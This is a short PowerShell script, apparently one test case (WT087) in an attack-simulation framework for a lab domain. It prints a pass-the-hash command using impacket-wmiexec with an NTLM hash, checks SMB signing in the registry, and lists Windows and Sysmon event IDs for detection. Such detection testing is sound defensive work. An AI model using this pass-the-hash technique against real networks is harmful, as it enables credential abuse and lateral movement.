# CADRE — WT087 — Pass-the-Hash
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT087 - Pass-the-Hash"
start_attack "087" "Pass-the-Hash"
step "Requires NTLM hash + SMB signing OFF target"
run_cmd "Write-Host 'PtH via impacket:'"
run_cmd "Write-Host '  impacket-wmiexec -hashes :<ntlm_hash> range.local/svc_naa@mbr02.range.local'"
step "Check SMB signing on mbr02"
run_cmd "Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' -Name RequireSecuritySignature"
result 0 "WT087 — check 4624 LogonType 3, 4648, Sysmon EID 3"
